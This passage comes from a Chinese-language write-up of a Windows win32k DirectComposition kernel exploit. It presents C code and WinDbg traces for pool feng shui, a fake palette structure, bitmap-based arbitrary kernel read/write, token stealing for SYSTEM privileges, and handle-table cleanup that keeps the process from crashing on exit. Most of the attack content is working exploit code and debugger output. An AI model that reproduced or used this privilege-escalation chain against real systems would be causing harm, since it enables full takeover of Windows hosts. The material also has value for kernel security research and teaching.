    kd> p
    win32kfull!GreSetPaletteEntries+0x79:
    ffff915c`473f35f9 7477            je      win32kfull!GreSetPaletteEntries+0xf2 (ffff915c`473f3672)
这样我对 szBuf 重新布局，当然，我们必须在 szBuf 中加入\x00，确保 StringCbLengthW 函数可以成功。
    //对szBuf重新布局
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10, sfBuf, sizeof(sfBuf));
        //make fake struct
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10, &hPLP,0x4);
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10 + 0x14, &lpFakeLenth, 0x4);
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10 + 0x28, &hDC, 0x4);
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10 + 0x48, &lpFakeSetEntries, sizeof(LPVOID));
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10 + 0x50, &lpFakeSetEntries, sizeof(LPVOID));
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10 + 0x78, &ManagerBitmap.pBitmap, sizeof(LPVOID));
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10 + 0x80, &pAcceleratorTableA, sizeof(LPVOID));
        CopyMemory((PUCHAR)pMappedAddress1 + 0x10 + 0x88, &lpFakeValidate, sizeof(LPVOID));
OK，当然我们\x00的位置也不要太靠后了，正常覆盖到 palette 的 pEntries 的位置就可以了，这样我们可以令 StringCbLengthW
函数正常返回，并且正常填充 palette 内核对象。
    //step 1
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d726:
    ffff8aae`1923d4e6 e849b30300      call    win32kbase!StringCbLengthW (ffff8aae`19278834)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d72b:
    ffff8aae`1923d4eb 85c0            test    eax,eax
    //***********StringCbLengthW函数返回成功
    kd> r eax
    eax=0
    //step 2
    //*********Copy DataBuf
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d73e:
    ffff8aae`1923d4fe e8b5b20300      call    win32kbase!StringCbCopyW (ffff8aae`192787b8)
    kd> p
    win32kbase! ?? ::FNODOBFM::`string'+0x1d743:
    ffff8aae`1923d503 85c0            test    eax,eax
    kd> dd ffff8ace81fa9310
    ffff8ace`81fa9310  3a080b88 0e5fc03a 8b6e2606 e583bcb7
    ffff8ace`81fa9320  3f20a031 01010101 3042e350 2d0491ed
    ffff8ace`81fa9330  156847e5 8b0a18ad 3f010b70 a307418e
    ffff8ace`81fa9340  75242394 d51c4f60 33749cc6 4a68c5ef
    ffff8ace`81fa9350  75242394 d51c4f60 81fa9340 ffff8ace
    ffff8ace`81fa9360  81fa9340 ffff8ace 33749cc6 4a68c5ef
    ffff8ace`81fa9370  75242394 d51c4f60 33749cc6 4a68c5ef
    ffff8ace`81fa9380  75242394 d51c4f60 
    ffff8ace`81fa9388  82017000 ffff8ace//pEntries change to ManageBitmap!!
一旦我们成功控制了 pEntries，就可以通过 pEntries 来实现对 bitmap 的 pvScan0 的控制了，这样，我们就可以通过控制
ManagerBitmap 的 pvScan0，让它指向 WorkerBitmap 的 pvScan0 来实现内核空间的任意地址读写。也就是
GetBitmapBits/SetBitmapBits，关于 Bitmap 这个方法，依然可以参考 Nicolas Economous 的
slide。最后我们直接读取 System 的 Token，来替换当前进程的 Token 完成提权。
    PROCESS ffffb0083dead040
        SessionId: none  Cid: 0004    Peb: 00000000  ParentCid: 0000
        DirBase: 001aa000  ObjectTable: ffff9b0a006032c0  HandleCount: 
        Image: System
    PROCESS ffffb0084103c800
        SessionId: 1  Cid: 1794    Peb: 6d54989000  ParentCid: 13d0
        DirBase: 22f52a000  ObjectTable: ffff9b0a06c88840  HandleCount: 
        Image: _dark_composition_.exe
    //System Token替换了Current Process Token
    kd> dd ffffb0083dead040+358 l2
    ffffb008`3dead398  006158a8 ffff9b0a 00000000 00000000
    kd> dd ffffb0084103c800+358 l2
    ffffb008`4103cb58  006158a8 ffff9b0a 0000a93a 00000000
#### 0x04 击垮隐藏Boss--Process exit的陷阱
如图，我们完成了提权，但是在进程退出的时候报错了。这是困扰我最久的问题，我经过了各种各样的尝试，多次请教了邱神相关的问题，最后终于解决了这个大 Boss。
其实错误有很多，首先我们对palette的覆盖，导致了palette在释放的时候产生了问题，不过既然我们此时已经拥有了任意内核地址的读写能力，我们直接对palette的内核空间做fix，将databuf覆盖的部分修改过来（置NULL）就可以了。也就是clear
kernel object。
        PVOID pPLPNULL = NULL;
        for (int i = 1; i  dd ffff8ace81fa9310 l1
    ffff8ace`81fa9310  08080b80
    kd> p
    0033:00007ff7`d64f20e1 c3              ret
    kd> p
    0033:00007ff7`d64f2000 498bcc          mov     rcx,r12
    //**********调用DeletePalette
    kd> p
    0033:00007ff7`d64f2003 ff150fc00000    call    qword ptr [00007ff7`d64fe018]
    //**********DeletePalette的对象是palette句柄，这次是真正释放palette了
    kd> r rcx
    rcx=0000000008080b80
    kd> p
    0033:00007ff7`d64f2009 4c8bb42488020000 mov     r14,qword ptr [rsp+288h]
    kd> !pool ffff8ace81fa9310
    Pool page ffff8ace81fa9310 region is Paged session pool
    //**********我们通过任意地址写修改kernel object之后顺利释放palette，内核对象处于free状态
    *ffff8ace81fa9300 size:  100 previous size:   70  (Free ) *DCdn
            Pooltag DCdn : DCOMPOSITIONTAG_DEBUGINFO, Binary : win32kbase!DirectComposition::C
     ffff8ace81fa9400 size:  100 previous size:  100  (Free )  DCvi
这时候进程退出时，是会将句柄表清空，句柄表对应的内核对象的池也会 free 掉，之前我们 DeletePalette 时会将 hPalette 移除，同时
free 掉内核空间，但是 free hresource 的时候，由于之前已经释放掉了池，导致了 double free 的发生。
因此，我们需要对句柄表进行一个 fix，我们将 hresource 在句柄表中移除，移除后在进程退出时，就不会再去释放 hresource
对应的内核空间了。接下来，我们就要在句柄表里找到 resource 句柄的位置。要找到 hresource 的位置我们首先要找到 channel
的位置，我们需要从 EPROCESS
结构一层层找进去。当然，此时我们已经拥有了任意地址读写的能力，去读取内核空间的地址中存放的值也不成问题，只需要根据偏移找到对应的值就可以了。
    //step 1
    //******EPROCESS里有一个Win32Process结构，这实际上是一个tagProcessInfo
    kd> dt _EPROCESS Win32Process
    nt!_EPROCESS
       +0x3a8 Win32Process : Void
    //step 2
    //**************tagPROCESSINFO里的tagTHREADINFO结构
     typedef struct _tagPROCESSINFO    // 55 elements, 0x300 bytes (sizeof)           
    {
    ……
    /*0x100*/     struct _tagTHREADINFO* ptiList;                                  
    …… 
    }tagPROCESSINFO, *PtagPROCESSINFO;  
    //step3
    //**********接下来找到handle table的入口，接下来找到channel的句柄值
    kd> dq ffff8ace81fb5fc0+28 l2
    ffff8ace`81fb5fe8  00000000`00000015//句柄 
    ffff8ace`81fb5ff0  ffff8ace`81f2f8b0//Channel的内核对象
在 handle table 中的 channel 中，＋0x28先存放的是句柄，然后＋0x30存放的是 Channel 的内核对象值，接下来我们进入到
channel 中找到 resource table 的存放位置，然后根据句柄＊找到
hresource，将其清零即可。当然，我们拥有任意地址读写的能力，只需要找到之后，将其置为 NULL 就可以了。
    //step 1
    //************找到resource table的位置
    kd> dq ffff8ace`81f2f8b0+40 l1
    ffff8ace`81f2f8f0  ffff8ace`81fa32a0
    //************找到handle的大小
    kd> dq ffff8ace`81f2f8b0+60 l1
    ffff8ace`81f2f910  00000000`00000008
    //resource table加上句柄大小与句柄值成积，找到hresource的位置
    kd> dd ffff8ace`81fa32a0
    ffff8ace`81fa32a0  00000000 00000000 00000000 00000000
    ffff8ace`81fa32b0  00000000 00000000 81f6b450 ffff8ace//hresource
    //step 2
    //**********将hResource置为NULL
    kd> p
    0033:00007ff6`5ed01678 ff1582d90000    call    qword ptr [00007ff6`5ed0f000]
    kd> p
    0033:00007ff6`5ed0167e eb11            jmp     00007ff6`5ed01691
    kd> dd ffff8ace`81fa32a0
    ffff8ace`81fa32a0  00000000 00000000 00000000 00000000
    ffff8ace`81fa32b0  00000000 00000000 00000000 00000000
最后，果然进程退出时不会再产生crash，我们最终完成了一个完整的利用。
Pool FengShui 是非常有意思的过程，和 Heap Fengshui
一样，如何对内核空间进行精巧的布局是内核安全的大佬们喜欢研究的东西，在我开始学内核漏洞的时候，感觉相关的文章不多，随着 Hacksys 的 HEVD
这个训练驱动，可以看到相关的 paper 越来越多了，非常感谢撰写文章的大佬们，令我受益良多。感谢邱神的指点，大米的交流讨论，感觉这几个月进步了很多。
其实内核里还有非常非常多有意思的东西等待被挖掘，Ring0 不同
Ring3，它拥有更复杂更广阔的内容，同样久有着无限的可能，期待自己更多的努力，更多的进步，也欢迎小伙伴们一起交流进步，感谢阅读！！
#### 0x05 引用
  * 
  * 
  * 
  * 
* * *